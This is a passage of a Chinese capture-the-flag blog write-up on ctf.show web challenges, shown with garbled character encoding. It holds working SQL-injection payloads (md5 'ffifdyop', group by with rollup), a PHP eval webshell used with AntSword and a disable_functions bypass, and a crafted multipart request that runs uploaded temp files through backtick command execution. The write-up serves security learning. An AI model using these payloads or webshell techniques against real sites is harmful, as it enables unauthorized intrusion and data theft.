class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨Â mysqlÂ å†…ï¼Œç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥ 1 å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚ password&#x3D;â€™ or â€˜1xxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äº password&#x3D;â€™ or 1ï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯ true<br>md5 (â€˜ffifdyopâ€™,true)&#x3D;â€™orâ€™6xxxxxx  åˆ©ç”¨è¿™ä¸ªä¼ å…¥ffifdyopå‚æ•°  åœ¨hackbarä¸­è¾“å…¥password&#x3D;ffifdyop   è§£å†³</p>
<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p><img src="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a2.png"><br>ç‚¹å‡»å–æ¶ˆå°±è‡ªåŠ¨ä¸‹è½½é™„ä»¶äº†  ä»£ç å®¡è®¡é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤å¯è¿™äº›å¸¸ç”¨çš„sqlæ³¨å…¥è¯­æ³•<br>çœ‹çœ‹å¤§ä½¬çš„payloadï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">u<span class="attr">sername</span><span class="operator">=</span> admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span>group<span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup<span class="comment">/**/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæˆ‘ä»¬è¦å­¦ä¹ sqlè¯­å¥ä¸­çš„group by  å’Œ with rollup   æ¥æºï¼š<a href="https://www.cnblogs.com/GTL-JU/p/16097234.html">https://www.cnblogs.com/GTL-JU/p/16097234.html</a><br><code>GROUP BY</code> å‡½æ•° ï¼š<br>    <code>GROUP BY</code> å‡½æ•°ç”¨äºå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œåˆ†ç±»ã€‚å®ƒåé¢è·Ÿéšçš„å­—æ®µæŒ‡å®šäº†åˆ†ç±»çš„ä¾æ®ã€‚<br>	ä¾‹å¦‚ï¼š <code>sql SELECT student FROM students GROUP BY age; -- æŒ‰ç…§å¹´é¾„å°†å­¦ç”Ÿåˆ†ç±»</code><br><code>WITH ROLLUP</code> å‡½æ•°:<br>	<code>WITH ROLLUP</code> å‡½æ•°é€šå¸¸è·Ÿåœ¨ <code>GROUP BY</code> å‡½æ•°åé¢ï¼Œç”¨äºå¯¹åˆ†ç±»åçš„æ•°æ®è¿›è¡Œæ±‡æ€»ç»Ÿè®¡ã€‚å®ƒä¼šåœ¨ <code>GROUP BY</code> å‡½æ•°çš„åŸºç¡€ä¸Šç”Ÿæˆæ±‡æ€»è¡Œï¼Œé€šå¸¸æ˜¯æŒ‰å„åˆ†ç±»çš„ç»Ÿè®¡æ•°æ®è¿›è¡Œåˆè®¡ã€‚åŠ å…¥ <code>WITH ROLLUP</code> åï¼Œç»“æœä¸­ä¼šå‡ºç°ä¸€è¡Œ <code>password</code> ä¸º <code>NULL</code>ã€‚<br>åªè¿›è¡Œgroup byå‡½æ•° ï¼š<br><img src="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a4.png"><br>å’Œwith rollupä¸€èµ·å•Šä½¿ç”¨ï¼š<br><img src="https://pic1.imgdb.cn/item/67ac6318d0e0a243d4fe97a5.png"></p>
<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>Â <img src="https://pic1.imgdb.cn/item/67ac634dd0e0a243d4fe97b2.png"><br>Â è¦è®©passwordå’Œsessionä¸­çš„passwordä¸€æ ·  ç”¨bpæŠ“åŒ…ä¿®æ”¹<br>Â <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line">Â <span class="attribute">GET</span> /login.php?password= HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">6187</span>d084-<span class="number">3</span>db8-<span class="number">49</span>d8-ace9-<span class="number">864432</span>c9ca24.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cookie</span>: </span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;117&quot;</span>, <span class="string">&quot;Not;A=Brand&quot;</span>;v=<span class="string">&quot;8&quot;</span></span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="number">0</span></span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua-Platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">117</span>.<span class="number">0</span>.<span class="number">5938</span>.<span class="number">132</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Site: same-origin</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Mode: navigate</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-User: ?<span class="number">1</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Dest: document</span><br><span class="line"><span class="attribute">Referer</span>: https://<span class="number">6187</span>d084-<span class="number">3</span>db8-<span class="number">49</span>d8-ace9-<span class="number">864432</span>c9ca24.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure></div><br>è¿™é‡Œå§Cookieæ¸…ç©º passwordä¹Ÿæ¸…ç©º<br>è§£é‡Šï¼š <code>Session</code> <strong>é€šå¸¸ä¾èµ– Cookie</strong> æ¥å­˜å‚¨ <code>Session ID</code>ï¼Œä¾‹å¦‚ï¼š<code>setcookie(&quot;PHPSESSID&quot;, session_id(), time() + 3600, &quot;/&quot;);</code><br>å½“ç”¨æˆ·è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æºå¸¦ <code>PHPSESSID</code>ï¼Œä»è€ŒæœåŠ¡å™¨å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ <code>Session</code> æ•°æ®ã€‚</p>
<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><img src="https://pic1.imgdb.cn/item/67ac6350d0e0a243d4fe97b3.png"><br>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">   </span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">---</span>|<span class="string">---</span>|</span><br><span class="line">||<span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span>|</span><br><span class="line">|||</span><br><span class="line">||<span class="string">&lt;head&gt;</span>|</span><br><span class="line">||<span class="string">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span>|</span><br><span class="line">||<span class="string">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width minimum-scale=1.0 maximum-scale=1.0 initial-scale=1.0&quot; /&gt;</span>|</span><br><span class="line">||<span class="string">&lt;title&gt;ctf.show_web12&lt;/title&gt;</span>|</span><br><span class="line">||<span class="string">&lt;/head&gt;</span>|</span><br><span class="line">||<span class="string">&lt;body&gt;</span>|</span><br><span class="line">||<span class="string">&lt;center&gt;</span>|</span><br><span class="line">||<span class="string">&lt;h2&gt;ctf.show_web12&lt;/h2&gt;</span>|</span><br><span class="line">||<span class="string">&lt;h4&gt;where is the flag?&lt;/h4&gt;</span>|</span><br><span class="line">||<span class="string">&lt;!-- hit:?cmd= --&gt;</span>|</span><br><span class="line">|||</span><br><span class="line">||<span class="string">&lt;/body&gt;</span>|</span><br><span class="line">||<span class="string">&lt;/html&gt;</span>|</span><br><span class="line">|||</span><br></pre></td></tr></table></figure></div>
<p>æç¤ºè¾“å…¥?cmd&#x3D;   è¾“å…¥?cmd&#x3D;phpinfo();æµ‹è¯• å‘ç°å¯ä»¥æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ è¯´æ˜æœ‰è¿œç¨‹æ‰§è¡Œæ¼æ´<br>æ–¹æ³•1:ç”¨ä¸€å¥è¯æœ¨é©¬ ç„¶åç”¨èšå‰‘è¿æ¥ <code>cmd=@eval($_POST[%27a%27]); </code><br>ä½†æ˜¯è¿æ¥è¿›å»ä¹‹åæŠ¥é”™<br><img src="https://pic1.imgdb.cn/item/67ac6357d0e0a243d4fe97bb.png"><br>è¿™æ˜¯æœ‰äº›ç½‘ç«™ä¸­ä¼šç¦ç”¨ php ä¸­çš„ä¸€äº›å±é™©å‡½æ•°ï¼Œå¯¼è‡´å³ä½¿ä¸Šä¼ é©¬ä¸Šå»ï¼Œä¹Ÿæ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œå¾ˆå…¸å‹çš„å°±æ˜¯<strong>å®å¡”çš„ç½‘ç«™</strong>ã€‚ ä¸‹è½½ç»•è¿‡Â disable_functions æ’ä»¶<br>èšå‰‘çš„æ’ä»¶å¸‚åœºè¦è®¿é—®githubè¦åœ¨è®¾ç½®ä»£ç† ä¿®æ”¹æˆæ¢¯å­çš„ä»£ç†<br><img src="https://pic1.imgdb.cn/item/67ac6359d0e0a243d4fe97be.png"><br><img src="https://pic1.imgdb.cn/item/67ac635bd0e0a243d4fe97c1.png" alt="|500"><br>é€‰æ‹©è¿™ä¸ªæ¨¡å¼ç»ˆäºå¯ä»¥è®¿é—®ç»ˆç«¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">(www-data:/<span class="keyword">var</span>/www/html)Â <span class="variable">$Â catÂ 903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;9fad8f78-6005-4246-8932-5ce7635a1647&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">(www-data:/<span class="keyword">var</span>/www/html)Â $</span><br></pre></td></tr></table></figure></div>
<p>æ–¹æ³•2: ç”¨phpä¸­çš„globå‡½æ•°  glob () å‡½æ•°è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚ è¾“å…¥<code>?cmd=print_r(glob(&#39;*&#39;));</code><br>å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªphpæ–‡ä»¶  æœ‰ä¿¡æ¯çš„é‚£ä¸ªphpæ–‡ä»¶çœ‹ä¸äº† æ‰€ä»¥ç”¨highlight_file () å‡½æ•°ï¼Œå¯ä»¥ä½¿æ–‡ä»¶å†…å®¹é«˜äº®æ˜¾ç¤ºï¼Œå¸¸ç”¨äºè¯»å–æ–‡ä»¶<br><code>?cmd=highlight_file(%27903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php%27);</code></p>
<p>æ–¹æ³•3: ç”¨<code>scandir(&#39;*&#39;);</code> å‡½æ•° å’Œ2 å·®ä¸å¤š</p>
<h1 id="çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬äºŒå¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬äºŒå¼¹"></a>çº¢åŒ…é¢˜ç¬¬äºŒå¼¹</h1><p>æŸ¥çœ‹æºç  æç¤ºè¾“å…¥cmd ç”¨getè¯·æ±‚ä¼ å…¥cmd ç»™å‡ºphpæºç <br><img src="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png"><br>è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šç¬¦å· åªæœ‰<code>p . \ = &lt; &gt; ?</code>Â å’Œåå¼•å·æ²¡æœ‰è¢«å±è”½</p>
<ol>
<li><p>PHP ä¸Šä¼ æœºåˆ¶ï¼š</p>
<p> åœ¨ php ä¸­ï¼Œä½¿ç”¨Â <code>Content-Type: multipart/form-data;</code>Â ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¼šå°†å®ƒä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œåœ¨ php çš„é…ç½®ä¸­Â <code>upload_tmp_dir</code>Â å‚æ•°ä¸ºä¿å­˜ä¸´æ—¶æ–‡ä»¶çš„è·¯ç»ï¼Œlinux ä¸‹é¢é»˜è®¤ä¸ºÂ <code>/tmp</code>ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦ php æ¥æ”¶ä¸Šä¼ è¯·æ±‚ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚å¦‚æœå…·æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œé‚£ä¹ˆä¼šå°†è¿™ä¸ªæ–‡ä»¶æ‹·èµ°å‚¨å­˜ã€‚æ— è®ºå¦‚ä½•åœ¨æ‰§è¡Œç»“æŸåè¿™ä¸ªæ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚å¹¶ä¸” php æ¯æ¬¡åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶åéƒ½æœ‰å›ºå®šçš„æ ¼å¼ï¼Œä¸º phpXXXX.tmpï¼ˆWindows ä¸­ï¼‰ã€php**.tmpï¼ˆLinux ä¸­ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ post åŒ…ï¼Œæ­¤æ—¶ php ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯ &#x2F;tmp&#x2F;phpxxxxxxï¼Œæ–‡ä»¶åæœ€å 6 ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚å¦‚ &#x2F;tmp&#x2F;php123abc </p>
</li>
<li><p>PHP ä¸­åå¼•å·ä½œç”¨ï¼šåœ¨ php é‡Œé¢åå¼•å·é‡Œé¢çš„å†…å®¹ä¼šè¢«å½“åš shell å‘½ä»¤è¢«æ‰§è¡Œã€‚ä¾‹å¦‚ <?php echo`whoami`; ?> ä¼šç›´æ¥å½“ä½œå‘½ä»¤æ‰§è¡Œ   </p>
</li>
<li><p><code>.</code>Â å·ç›¸å½“äºÂ <code>source</code>Â å‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤å¯ä»¥ç›´æ¥æŠŠæ–‡ä»¶å†…å®¹å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äºæŠŠæ–‡ä»¶ç›´æ¥å½“ä½œ shell è„šæœ¬æ‰§è¡Œ </p>
</li>
<li><p><code>&lt;?=</code>Â ç›¸å½“äºÂ <code>&lt;?php ehco</code>Â çš„ç®€å†™ç‰ˆ</p>
</li>
<li><p><code>?</code>Â ç›¸å½“äºå­—ç¬¦çš„é€šé…ç¬¦</p>
</li>
<li><p><code>+</code>Â ç›¸å½“äºç©ºæ ¼  </p>
</li>
<li><p>payload æ„é€ </p>
</li>
</ol>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&gt; /?cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`;</span><br><span class="line">`<span class="meta">?&gt;</span>`ï¼šé—­åˆå‰é¢çš„Â `<span class="meta">&lt;?php</span>`Â å‘½ä»¤</span><br><span class="line">`<span class="meta">&lt;?=</span>`ï¼šç›¸å½“äºÂ `<span class="meta">&lt;?php</span> <span class="keyword">echo</span>`</span><br><span class="line">åå¼•å·ï¼šæ‰§è¡Œå‘½ä»¤</span><br><span class="line">`.`Â ç›¸å½“äºÂ `source`Â å‘½ä»¤</span><br><span class="line">`+`ï¼šç›¸å½“äºç©ºæ ¼</span><br><span class="line">`?`ï¼šæ–‡å­—é€šé…ç¬¦ï¼Œè´Ÿè´£æ‰§è¡Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>
<p>payloadä¸­ç”¨äº†??p æ›¿ä»£äº†tmp  p?p ä»£æ›¿php<br>å…ˆç”¨hackbarå‘é€postä½†æ˜¯ä¸ä¼ æ•°æ® ç„¶åæŒ‡å®š<br>å‘é€ä¸‹é¢è¯·æ±‚åŒ…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ee6eb8bb-2686-490f-84db-a4abf42beb04.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>244</span><br><span class="line"></span><br><span class="line"><span class="language-nix">-----------------------------<span class="number">10242300956292313528205888</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Disposition:</span> form-data; <span class="attr">name</span><span class="operator">=</span><span class="string">&quot;fileUpload&quot;</span>; <span class="attr">filename</span><span class="operator">=</span><span class="string">&quot;1.txt&quot;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> text<span class="symbol">/plain</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="comment">#! /bin/bash</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">cat <span class="symbol">/flag.txt</span></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>----------------------------<span class="number">1024230095629231352820588</span>8--</span></span><br></pre></td></tr></table></figure></div>
<p>æˆ‘åˆšçœ‹åˆ°wpä¸­çš„è¿™ä¸ªè¯·æ±‚åŒ…ä¹Ÿæ˜¯ä¸€å¤´é›¾æ°´ï¼ŒæŠŠbpä¸­æŠ“çš„åŒ…å‘é€åˆ°repeaterä¸­ï¼Œç„¶åä¿®æ”¹ç¬¬ä¸€è¡Œï¼Œè¯·æ±‚æ–¹å¼æ”¹æˆPOSTï¼Œcmdä¼ å…¥payload<br>ç„¶ååœ¨Connection: closeåé¢åŠ ä¸Šå“ªäº›å‚æ•°ï¼Œboundaryå¯ä»¥è‡ªå·±å®šä¹‰ã€‚<br>ä½¿ç”¨Content-Type: multipart&#x2F;form-data</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><img src="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png"><br>é¢˜ç›®è¿™é‡Œåªæœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶æŒ‰é’®<br>å¦‚æœæˆ‘éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¼šæ˜¾ç¤ºerror file zise ï¼Œè¯´æ˜å¯¹æ–‡ä»¶çš„å¤§å°æœ‰é™åˆ¶  å¹¶ä¸”ä¸Šä¼ ç•Œé¢åœ¨&#x2F;upload.phpä¸­<br>æ ¹æ®ç½‘ä¸Šçš„wpï¼ŒçŸ¥é“å¦‚æœæƒ³è¦çœ‹æºæ–‡ä»¶ï¼Œä¸€èˆ¬å¯ä»¥ä».bak .gitÂ .hg  .DS_Store è·å–ï¼Œæ‰€ä»¥è¾“å…¥&#x2F;upload.php.bakï¼Œå¾—åˆ°æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ 